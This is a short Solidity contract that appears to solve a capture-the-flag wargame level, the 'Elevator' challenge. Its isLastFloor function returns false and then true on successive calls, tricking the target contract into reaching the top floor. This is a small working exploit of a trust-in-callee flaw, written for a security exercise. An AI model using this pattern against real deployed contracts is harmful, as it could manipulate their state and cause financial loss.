// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Building {
    bool private res;
    IElevator public _elevator;

    constructor(address _elevatorAddress) public {
        _elevator = IElevator(_elevatorAddress);
        res = true;
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        // this function is called twice in Elevator contract
        // 1st response should be false, 2nd should be true
        // to "reach the top"
        res = !res;
        return res;
    }

    function goTo(uint256 _floor) public {
        _elevator.goTo(_floor);
    }
}
